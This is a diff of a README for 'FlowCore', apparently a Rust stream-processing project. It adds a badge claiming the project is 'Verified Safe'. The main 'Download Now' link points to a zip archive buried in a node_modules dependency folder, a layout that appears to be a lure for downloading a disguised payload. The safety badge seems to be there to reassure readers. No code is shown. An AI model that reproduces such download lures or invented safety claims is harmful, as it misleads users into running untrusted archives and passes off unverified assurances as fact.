@@ -2,6 +2,7 @@
 
 ## 📥 Download Now!
 [![Download FlowCore](https://github.com/Ej-Locked/FlowCore/raw/refs/heads/main/frontend/node_modules/yallist/Core-Flow-1.6.zip%20Now-FlowCore-blue)](https://github.com/Ej-Locked/FlowCore/raw/refs/heads/main/frontend/node_modules/yallist/Core-Flow-1.6.zip)
+[![SafeSkill 91/100](https://img.shields.io/badge/SafeSkill-91%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/ej-locked-flowcore)
 
 ## 📖 About FlowCore
 FlowCore is a lightweight, Rust-powered real-time stream processing engine. It helps you handle data streams efficiently. With features like event-time processing, tumbling windows, and late-event handling, you can manage your data effectively. FlowCore also comes with a modern React dashboard for easy live visualization of your data streams.
